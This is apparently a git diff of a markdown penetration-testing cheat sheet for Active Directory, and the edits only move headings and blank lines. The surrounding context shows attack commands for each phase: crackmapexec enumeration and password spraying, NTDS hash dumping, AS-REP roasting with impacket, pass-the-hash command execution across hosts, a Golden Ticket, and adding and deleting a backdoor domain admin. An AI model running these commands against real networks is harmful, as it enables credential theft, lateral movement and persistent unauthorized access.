@@ -6,8 +6,8 @@ All private IPs are replaced with **`$target`**.
 
 ---
 
-## 1. Enumeration Phase
 
+## 1. Enumeration Phase
 ### 1.1 SMB Enumeration (Unauthenticated)
 
 ```bash
@@ -75,11 +75,11 @@ crackmapexec ldap $target -u user -p password
 ```
 
 **Explanation**: Enumerates LDAP information such as domain structure and policies.
-
 ---
 
-## 2. Credential Access / Breaching Phase
 
+
+## 2. Credential Access / Breaching Phase
 ### 2.1 Password Spraying
 
 ```bash
@@ -127,11 +127,11 @@ crackmapexec smb $target -u administrator -p password --ntds
 ```
 
 **Explanation**: Dumps all Active Directory domain hashes.
-
 ---
 
-## 3. Exploitation Phase (Impacket)
 
+
+## 3. Exploitation Phase (Impacket)
 ### 3.1 Remote Command Execution (PsExec)
 
 ```bash
@@ -189,11 +189,12 @@ impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip $target
 ```
 
 **Explanation**: Retrieves AS-REP hashes for users without Kerberos pre-authentication.
-
 ---
 
-## 4. Privilege Escalation & Lateral Movement
 
+
+
+## 4. Privilege Escalation & Lateral Movement
 ### 4.1 Enumerate Admin Access
 
 ```bash
@@ -211,11 +212,12 @@ crackmapexec smb targets.txt -u admin -H NTLM_HASH -x "whoami"
 ```
 
 **Explanation**: Executes a command across multiple hosts using lateral movement.
-
 ---
 
-## 5. Persistence Phase
 
+
+
+## 5. Persistence Phase
 ### 5.1 Add New Domain Admin User
 
 ```bash
@@ -243,11 +245,12 @@ impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.loca
 ```
 
 **Explanation**: Generates a Golden Ticket for long-term domain persistence.
-
 ---
 
-## 6. Cleanup (Recommended)
 
+
+
+## 6. Cleanup (Recommended)
 ```bash
 crackmapexec smb $target -u administrator -p password -x "net user backdoor /delete /domain"
 ```
